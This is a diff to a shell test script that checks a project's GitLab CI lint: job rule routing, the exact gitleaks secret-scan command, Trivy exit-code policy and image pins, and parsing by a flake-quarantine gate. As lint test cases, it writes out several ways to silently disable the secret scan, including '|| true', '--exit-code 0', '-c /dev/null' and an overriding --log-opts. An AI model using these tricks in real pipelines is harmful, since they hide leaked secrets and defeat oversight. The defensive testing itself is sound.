+has_both=0
+Y="$(cat "$ci")" JS="$gl_js"'
+  y = withBoth(y);' node -e '
+  const y = process.env.Y;
+  if (new Function("y", process.env.JS + "; return y;")(y) !== y) process.exit(3);
+' || has_both=1
+lint_to_out proxy ci-split
+if [ "$rc" -eq 0 ] && [ "$has_both" -eq 0 ]; then
+  echo "ok   p245: the committed pipeline with --log-opts=\"\$CI_COMMIT_SHA\" and GIT_DEPTH: 0 on scan:gitleaks passes"
+else
+  echo "FAIL p245: the committed pipeline with --log-opts=\"\$CI_COMMIT_SHA\" and GIT_DEPTH: 0 on scan:gitleaks passes (exit $rc, want 0; one of the two missing on scan:gitleaks: $has_both)"
+  sed 's/^/     /' "$out"
+  failed=1
+fi
+# Cases p247-p258 (#142): the #141 checks follow every route a rule entry can take into a job, not only a literal
+# entry. A secret scan or the lint (lint, scan:gitleaks, private-details) reaching a `when: never` entry that names
+# $TRANSLATE is refused by any route: through extends, through !reference to a key of the file (the whole key, or its
+# rules), or through a chain of them; and on the five jobs that skip the translation pipeline, an entry reached by
+# !reference that can run the job (anything but `when: never`) before `*not_translation` counts as running it. The
+# route is built in hidden keys at the end of the file, so the committed jobs stay as they are but for the one edit.
+# p247 puts the route through extends, which the check already followed: it must keep refusing.
+rt_js="$tr_js"'
+  const hidden = (y, name, body) => y + "\n" + name + ":\n" + body;
+  const swapRules = (y, job, repl) => edit(y, job, (b) => b.replace(/  rules:\n(?: {4}.*\n)+/, repl));
+  const RT = "    - !reference [.not_translation]\n";
+  const before = (y, job, entry) => edit(y, job, (b) => b.replace("    - *not_translation\n", entry + "    - *not_translation\n"));'
+split_case "p247: lint taking the translation skip by extends" $ci "$(tr_name 'lint')" "$rt_js"'
+  y = swapRules(hidden(withFive(y), ".route_rules", "  rules:\n    - *not_translation\n"), "lint", "  extends: .route_rules\n");'
+split_case "p248: lint taking the translation skip by !reference to the entry itself" $ci "$(tr_name 'lint')" "$rt_js"'
+  y = plant(withFive(y), "lint", RT);'
+split_case "p249: scan:gitleaks taking the translation skip by !reference to the rules of a hidden job" $ci "$(tr_name 'scan:gitleaks')" "$rt_js"'
+  y = swapRules(hidden(withFive(y), ".route_rules", "  rules:\n    - *not_translation\n"), "scan:gitleaks", "  rules:\n    - !reference [.route_rules, rules]\n    - when: on_success\n");'
+split_case "p250: private-details taking the translation skip by !reference to a hidden list" $ci "$(tr_name 'private-details')" "$rt_js"'
+  y = swapRules(hidden(withFive(y), ".route_list", "  - *not_translation\n"), "private-details", "  rules:\n    - !reference [.route_list]\n    - when: on_success\n");'
+split_case "p251: lint taking the translation skip by !reference to a hidden job whole" $ci "$(tr_name 'lint')" "$rt_js"'
+  y = swapRules(hidden(withFive(y), ".route_rules", "  rules:\n    - *not_translation\n"), "lint", "  rules:\n    - !reference [.route_rules]\n    - when: on_success\n");'
+split_case "p252: scan:gitleaks taking the translation skip by a chain of two !reference" $ci "$(tr_name 'scan:gitleaks')" "$rt_js"'
+  y = hidden(hidden(withFive(y), ".route_rules", "  rules:\n    - *not_translation\n"), ".route_outer", "  rules:\n    - !reference [.route_rules, rules]\n");
+  y = swapRules(y, "scan:gitleaks", "  rules:\n    - !reference [.route_outer, rules]\n    - when: on_success\n");'
+split_case "p253: live:firefox with a !reference to a rules list that runs it before the translation skip" $ci "$(tr_name 'live:firefox')" "$rt_js"'
+  y = before(hidden(withFive(y), ".route_runs", "  rules:\n    - when: on_success\n"), "live:firefox", "    - !reference [.route_runs, rules]\n");'
+split_case "p254: coverage with a !reference to a hidden list that runs it before the translation skip" $ci "$(tr_name 'coverage')" "$rt_js"'
+  y = before(hidden(withFive(y), ".route_runs", "  - if: $CI_COMMIT_BRANCH\n"), "coverage", "    - !reference [.route_runs]\n");'
+split_case "p255: lint:test with a !reference to a rules list that runs it before the translation skip, after one that does not" $ci "$(tr_name 'lint:test')" "$rt_js"'
+  y = before(hidden(withFive(y), ".route_runs", "  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\"\n      when: never\n    - when: always\n"), "lint:test", "    - !reference [.route_runs, rules]\n");'
+split_case "p256: lint:import with a chain of two !reference to a rules list that runs it before the translation skip" $ci "$(tr_name 'lint:import')" "$rt_js"'
+  y = before(hidden(hidden(withFive(y), ".route_runs", "  rules:\n    - when: on_success\n"), ".route_outer", "  rules:\n    - !reference [.route_runs, rules]\n"), "lint:import", "    - !reference [.route_outer, rules]\n");'
+split_case "p257: live:chromium with a !reference to an entry that sets no when before the translation skip" $ci "$(tr_name 'live:chromium')" "$rt_js"'
+  y = before(hidden(withFive(y), ".route_runs", "  rules:\n    - if: $CI_COMMIT_BRANCH\n"), "live:chromium", "    - !reference [.route_runs, rules]\n");'
+# a !reference to entries that can never run the job, before the skip, is no fault: the committed file does this
+# with the catch-up and batch-intake snippets (resolved elsewhere); this one is a key of the file itself
+split_pass_case "p258: live:firefox with a !reference to a rules list of when: never entries before the translation skip" $ci "$rt_js"'
+  y = before(hidden(withFive(y), ".route_never", "  rules:\n    - if: $CI_PIPELINE_SOURCE == \"schedule\"\n      when: never\n"), "live:firefox", "    - !reference [.route_never, rules]\n");'
+# Cases p259-p267 (#146): scan:gitleaks has exactly one script line running gitleaks, and it is exactly
+# `gitleaks git --no-banner --redact --verbose --log-opts="$CI_COMMIT_SHA" "$CI_PROJECT_DIR"`, the line translate_docs and
+# publish_translations use. Each bypass below scans less or nothing while the text --log-opts="$CI_COMMIT_SHA" is still
+# on a line with `gitleaks git`: the command only echoed, made to succeed, a config that disables the rules, or a later
+# --log-opts that wins over the right one. A refusal names .gitlab-ci.yml and scan:gitleaks.
+gx_js="$gl_js"'
+  const GL = "gitleaks git --no-banner --redact --verbose " + opt + " \"$CI_PROJECT_DIR\"";
+  const setCmd = (y, line) => edit(withBoth(y), (b) => {
+    const r = b.replace(/^    - gitleaks git .*$/m, () => line);
+    if (r === b) throw new Error("scan:gitleaks has no gitleaks git line to replace");
+    return r;
+  });'
+split_case "p259: scan:gitleaks running gitleaks only as the argument of echo" $ci "$gl_name" "$gx_js"'
+  y = setCmd(y, "    - echo gitleaks git --log-opts=\"$CI_COMMIT_SHA\"");'
+split_case "p260: scan:gitleaks with || true after the scan" $ci "$gl_name" "$gx_js"'
+  y = setCmd(y, "    - " + GL + " || true");'
+split_case "p261: scan:gitleaks with --exit-code 0" $ci "$gl_name" "$gx_js"'
+  y = setFlags(withBoth(y), "--no-banner --redact --verbose " + opt + " --exit-code 0");'
+split_case "p262: scan:gitleaks with -c /dev/null" $ci "$gl_name" "$gx_js"'
+  y = setFlags(withBoth(y), "--no-banner --redact --verbose " + opt + " -c /dev/null");'
+split_case "p263: scan:gitleaks with a second --log-opts of HEAD~1 after the right one" $ci "$gl_name" "$gx_js"'
+  y = setFlags(withBoth(y), "--no-banner --redact --verbose " + opt + " --log-opts=\"HEAD~1\"");'
+split_case "p264: scan:gitleaks with a second --log-opts of --max-count=1 after the right one" $ci "$gl_name" "$gx_js"'
+  y = setFlags(withBoth(y), "--no-banner --redact --verbose " + opt + " --log-opts=\"--max-count=1\"");'
+split_case "p265: scan:gitleaks with a second --log-opts of --branches after the right one" $ci "$gl_name" "$gx_js"'
+  y = setFlags(withBoth(y), "--no-banner --redact --verbose " + opt + " --log-opts=\"--branches\"");'
+split_case "p266: scan:gitleaks with a second gitleaks line, the right one repeated" $ci "$gl_name" "$gx_js"'
+  y = edit(withBoth(y), (b) => b.replace(/^(    - gitleaks git .*\n)/m, (all) => all + all));'
+split_case "p267: scan:gitleaks with a second gitleaks line, a scan of another path that carries the right --log-opts" $ci "$gl_name" "$gx_js"'
+  y = edit(withBoth(y), (b) => b.replace(/^(    - gitleaks git .*\n)/m, (all) => all + "    - gitleaks git --no-banner --redact --verbose " + opt + " .\n"));'
 # Cases (d1)-(d3) judge the section "the imported docs have the shape the import
 # writes" (issue #18): the pad draws the index's colour and ids into innerHTML.
 # shape_case <label> <file> <js>: <js> edits the parsed JSON j of the file.
@@ -2471,6 +2735,170 @@ if [ "$rc" -eq 0 ]; then
 else
   echo "FAIL (p8i) the committed tree passes the whole lint (exit $rc, want 0)"; sed 's/^/     /' "$out"; failed=1
 fi
+
+# Case (d-s1) (D-S1, #138): .gitlab-ci.yml says a newly published CVE fails the daily Trivy run "and not an unrelated
+# merge request". Every job that runs trivy is judged by running its script lines with a stand-in `trivy` that logs
+# its arguments, once with CI_PIPELINE_SOURCE=schedule and once with merge_request_event and push: the vulnerability
+# scan (--scanners without it, or with vuln) must carry --exit-code 1 on the schedule, and --exit-code 0 (or none) in a
+# pipeline that is not the schedule, unless that pipeline's rules leave the job out (when: never, no rule) or let it
+# fail (allow_failure: true). Secrets and licences always block, so a scan of those only is not judged. A script that
+# merely mentions CI_PIPELINE_SOURCE, or that swaps the two branches, therefore fails. Read from the committed file
+# with the js-yaml the lint uses.
+cat > "$cspjs.trivy" <<'JS'
+const fs = require("fs"), os = require("os"), path = require("path"), cp = require("child_process"), yaml = require("js-yaml");
+const ref = yaml.defineSequenceTag("!reference", { create: () => [], addItem: (c, i) => { c.push(i); }, finalize: (c) => ({ "!reference": c }), identify: () => false });
+const doc = yaml.load(fs.readFileSync(".gitlab-ci.yml", "utf8"), { schema: yaml.CORE_SCHEMA.withTags(ref) });
+const lines = (v) => (Array.isArray(v) ? v.flat(Infinity) : [v]).filter((x) => typeof x === "string");
+const dir = fs.mkdtempSync(path.join(os.tmpdir(), "trivy-shim-")), log = path.join(dir, "log");
+fs.writeFileSync(path.join(dir, "trivy"), "#!/bin/sh\necho \"$*\" >> \"$TRIVY_LOG\"\n", { mode: 0o755 });
+// the vulnerability scans a job's script makes in a pipeline of this source, with the --exit-code each carries
+const scans = (job, source) => {
+  fs.writeFileSync(log, "");
+  for (const l of lines(job.script)) cp.spawnSync("sh", ["-c", l], { env: { PATH: dir + ":" + process.env.PATH, CI_PIPELINE_SOURCE: source, TRIVY: "true", TRIVY_LOG: log, CI_PROJECT_DIR: process.cwd() } });
+  return fs.readFileSync(log, "utf8").split("\n").filter(Boolean).map((a) => {
+    const sc = /--scanners[ =](\S+)/.exec(a), code = /--exit-code[ =](\S+)/.exec(a);
+    return { vuln: !sc || sc[1].split(",").includes("vuln"), code: code ? code[1] : "0", args: a };
+  }).filter((c) => c.vuln);
+};
+const bad = [];
+let jobs = 0;
+for (const [name, job] of Object.entries(doc)) {
+  if (!job || typeof job !== "object" || !job.script || !lines(job.script).some((l) => /\btrivy\b/.test(l))) continue;
+  jobs++;
+  if (!scans(job, "schedule").some((c) => c.code === "1")) bad.push(name + ": its daily schedule run has no vulnerability scan with --exit-code 1, so a new CVE would not fail it");
+  // the first rule that matches a pipeline that is not the schedule: no `if`, or an `if` that does not ask for the schedule
+  const rule = (job.rules || []).find((r) => r && !r["!reference"] && !(typeof r.if === "string" && /==\s*"schedule"/.test(r.if)));
+  if (!rule || rule.when === "never" || rule.allow_failure === true) continue;
+  for (const src of ["merge_request_event", "push"]) for (const c of scans(job, src)) if (c.code !== "0") bad.push(name + ": a " + src + " pipeline runs a vulnerability scan with --exit-code " + c.code + ", so a new CVE fails an unrelated pipeline");
+}
+fs.rmSync(dir, { recursive: true, force: true });
+if (jobs === 0) { console.log("no job runs trivy"); process.exit(2); }
+if (bad.length) { console.log(bad.join("\n")); process.exit(1); }
+JS
+rc=0
+node "$cspjs.trivy" > "$out" 2>&1 || rc=$?
+if [ "$rc" -eq 0 ]; then
+  echo "ok   (d-s1) a new CVE fails the daily Trivy run only, not an unrelated pipeline"
+else
+  echo "FAIL (d-s1) a new CVE fails the daily Trivy run only, not an unrelated pipeline (exit $rc)"; sed 's/^/     /' "$out"; failed=1
+fi
+# the same judgement on planted scripts: the branches swapped, and a comment that only names CI_PIPELINE_SOURCE (both fail),
+# and the committed script's own shape (control, passes)
+trivy_case() { # trivy_case <label> <want: 0 or 1> <js: edits y>
+  F=.gitlab-ci.yml JS="$3" node -e '
+    const fs = require("fs"); let y = fs.readFileSync(process.env.F, "utf8"); const before = y;
+    y = new Function("y", process.env.JS + "; return y;")(y);
+    if (y === before) { console.error("the edit changed nothing"); process.exit(3); }
+    fs.writeFileSync(process.env.F, y);
+  ' || { echo "FAIL $1 (the test edit did not apply)"; failed=1; return; }
+  commit_all "$1"
+  rc=0
+  node "$cspjs.trivy" > "$out" 2>&1 || rc=$?
+  if [ "$rc" -eq "$2" ]; then
+    echo "ok   $1 (exit $rc)"
+  else
+    echo "FAIL $1 (exit $rc, want $2)"; sed 's/^/     /' "$out"; failed=1
+  fi
+  git reset -q --hard HEAD~1
+}
+trivy_case "(d-s1b) scan:trivy with the exit codes swapped between schedule and the rest fails" 1 '
+  y = y.replace("= schedule ]; then vuln_exit=\"--exit-code 1\"; else vuln_exit=\"--exit-code 0\"; fi", "= schedule ]; then vuln_exit=\"--exit-code 0\"; else vuln_exit=\"--exit-code 1\"; fi");'
+trivy_case "(d-s1c) scan:trivy with --exit-code 1 on every pipeline and a comment naming CI_PIPELINE_SOURCE fails" 1 '
+  y = y.replace(/      if \[ "\$CI_PIPELINE_SOURCE" = schedule \]; then vuln_exit="--exit-code 1"; else vuln_exit="--exit-code 0"; fi\n/, "      # CI_PIPELINE_SOURCE = schedule fails on a CVE, anything else does not\n      vuln_exit=\"--exit-code 1\"\n");'
+trivy_case "(d-s1d) scan:trivy never failing on a vulnerability, not even on the schedule, fails" 1 '
+  y = y.replace("then vuln_exit=\"--exit-code 1\"; else", "then vuln_exit=\"--exit-code 0\"; else");'
+rm -f "$cspjs.trivy"
+
+# Cases (f2a)-(f2e) (ALL-F2, #138): private-details runs the same gitleaks release as scan:gitleaks (its comment says
+# so), but pins it a second time from a variable-prefixed image name Renovate cannot see. The lint must refuse, naming
+# gitleaks: a bump of one pin alone (by tag, by digest), one pin deleted (either job), and a second pin that is only
+# in a comment (the private-details image replaced by another, its old pin kept in a comment), which is no pin.
+gl_pins_case() { # gl_pins_case <label> <js: edits y>
+  F=.gitlab-ci.yml JS="$2" node -e '
+    const fs = require("fs"); let y = fs.readFileSync(process.env.F, "utf8"); const before = y;
+    y = new Function("y", process.env.JS + "; return y;")(y);
+    if (y === before) { console.error("the edit changed nothing"); process.exit(3); }
+    fs.writeFileSync(process.env.F, y);
+  ' || { echo "FAIL $1 (the test edit did not apply)"; failed=1; return; }
+  commit_all "$1"
+  lint_to_out
+  if [ "$rc" -eq 1 ] && grep -qi gitleaks "$out"; then
+    echo "ok   $1 fails"
+  else
+    echo "FAIL $1 fails (exit $rc, want 1 naming gitleaks)"; sed 's/^/     /' "$out"; failed=1
+  fi
+  git reset -q --hard HEAD~1
+}
+gl_pins_case "(f2a) private-details pinning another gitleaks version than scan:gitleaks" '
+  y = y.replace(/(\$CI_IMAGE_CACHE_GHCR\/gitleaks\/gitleaks:)v[0-9.]+/, "$1v8.99.0");'
+gl_pins_case "(f2b) private-details pinning another gitleaks digest than scan:gitleaks" '
+  y = y.replace(/(\$CI_IMAGE_CACHE_GHCR\/gitleaks\/gitleaks:\S+@sha256:)[0-9a-f]{8}/, (m, a) => a + "00000000");'
+gl_pins_case "(f2c) private-details with no gitleaks pin" '
+  y = y.replace(/\$CI_IMAGE_CACHE_GHCR\/gitleaks\/gitleaks:\S+/, "$CI_IMAGE_CACHE_GHCR/other/tool:1.0.0@sha256:" + "0".repeat(64));'
+gl_pins_case "(f2d) scan:gitleaks with no gitleaks pin" '
+  y = y.replace(/ghcr\.io\/gitleaks\/gitleaks:\S+/, "ghcr.io/other/tool:1.0.0@sha256:" + "0".repeat(64));'
+gl_pins_case "(f2e) the second gitleaks pin only in a comment" '
+  y = y.replace(/(\n  image:\n    name: )(\$CI_IMAGE_CACHE_GHCR\/gitleaks\/gitleaks:\S+)/, "\n  # was $2$1$CI_IMAGE_CACHE_GHCR/other/tool:1.0.0@sha256:" + "0".repeat(64));'
+
+# Cases (f-sec12a)-(f-sec12i) (SEC-12, #138): tools/ci/flake-gate.sh counts as a quarantine only a call that starts a
+# line, `await quarantined("#<issue>",` (indent allowed); the lint refuses any other `quarantined("#` in tools/ci/*.mjs,
+# so nothing hides a text the gate would misread. The gate cases plant one line in a file of their own beside a
+# flakes.md of one flake at three sightings linking #777: no quarantine is counted from a comment, a string, a template
+# literal or a call after other code (exit 1, not-quarantined), and an anchored call is (exit 0). The lint cases append
+# the line to a tracked test file and want the lint to name the file and quarantined.
+cat > docs/flakes.md <<'MD'
+# Flakes
+
+## made-up check: it times out [#777](https://example.invalid/issues/777)
+
+- 2026-11-01 · aaaaaaa · job one · timed out
+- 2026-11-02 · bbbbbbb · job two · timed out
+- 2026-11-03 · ccccccc · job three · timed out
+MD
+git add -f docs/flakes.md
+git -c user.name=t -c user.email=t@t commit -q -m "one flake at three sightings"
+flake_case() { # flake_case <label> <want: 0 or 1> <lines planted in tools/ci/zz-flake-fixture.mjs>
+  printf '%s\n' "$3" > tools/ci/zz-flake-fixture.mjs
+  git add -f tools/ci/zz-flake-fixture.mjs
+  git -c user.name=t -c user.email=t@t commit -q -m "$1"
+  rc=0
+  sh tools/ci/flake-gate.sh > "$out" 2>&1 || rc=$?
+  if [ "$rc" -eq "$2" ]; then
+    echo "ok   $1 (exit $rc)"
+  else
+    echo "FAIL $1 (exit $rc, want $2)"; sed 's/^/     /' "$out"; failed=1
+  fi
+  git reset -q --hard HEAD~1
+}
+flake_case "(f-sec12a) quarantined(\"#777\", in a line comment is not a quarantine" 1 '// await quarantined("#777", ["firefox"], "made-up check", async () => {});'
+flake_case "(f-sec12b) quarantined(\"#777\", in a block comment is not a quarantine" 1 '/*
+ await quarantined("#777", ["firefox"], "made-up check")
+ */'
+flake_case "(f-sec12c) a trailing // quarantined(\"#777\", after /\"/ is not a quarantine" 1 'export const re = /"/; // quarantined("#777", ["firefox"], "made-up check")'
+flake_case "(f-sec12d) quarantined(\"#777\") in a string is not a quarantine" 1 "export const s = 'quarantined(\"#777\")';"
+flake_case "(f-sec12e) quarantined(\"#777\", in a template literal is not a quarantine" 1 'export const t = `await quarantined("#777", [])`;'
+flake_case "(f-sec12f) a real call placed after other code on its line is not a quarantine" 1 'export const re = /[/*]/; await quarantined("#777", ["firefox"], "made-up check", async () => {});'
+flake_case "(f-sec12g) an anchored await quarantined(\"#777\", call is a quarantine (control)" 0 'await quarantined("#777", ["firefox"], "made-up check", async () => {});'
+flake_case "(f-sec12h) an indented anchored await quarantined(\"#777\", call is a quarantine (control)" 0 '  await quarantined("#777", ["firefox"], "made-up check", async () => {});'
+git reset -q --hard HEAD~1
+flake_lint_case() { # flake_lint_case <label> <want: 0 or 1> <line appended to tools/ci/dates-test.mjs>
+  printf '%s\n' "$3" >> tools/ci/dates-test.mjs
+  commit_all "$1"
+  lint_to_out
+  if [ "$2" -eq 1 ] && [ "$rc" -eq 1 ] && grep -i quarantined "$out" | grep -q 'dates-test\.mjs'; then
+    echo "ok   $1 fails"
+  elif [ "$2" -eq 0 ] && [ "$rc" -eq 0 ]; then
+    echo "ok   $1 passes"
+  else
+    echo "FAIL $1 (exit $rc, want $2: 1 naming dates-test.mjs and quarantined, 0 passing)"; sed 's/^/     /' "$out"; failed=1
+  fi
+  git reset -q --hard HEAD~1
+}
+flake_lint_case "(f-sec12i) the lint refusing quarantined(\"#777\") in a string" 1 "export const s7 = 'quarantined(\"#777\")';"
+flake_lint_case "(f-sec12j) the lint refusing quarantined(\"#777\", in a template literal" 1 'export const t7 = `await quarantined("#777", [])`;'
+flake_lint_case "(f-sec12k) the lint refusing a real call after other code on its line" 1 'export const re7 = /[/*]/; await quarantined("#777", ["firefox"], "made-up check", async () => {});'
+flake_lint_case "(f-sec12l) the lint refusing quarantined(\"#777\", in a line comment" 1 '// await quarantined("#777", ["firefox"], "made-up check")'
+flake_lint_case "(f-sec12m) the lint accepting an anchored await quarantined(\"#777\", call (control)" 0 'await quarantined("#777", ["firefox"], "made-up check", async () => {});'
 
 rm -f "$cspjs"
 
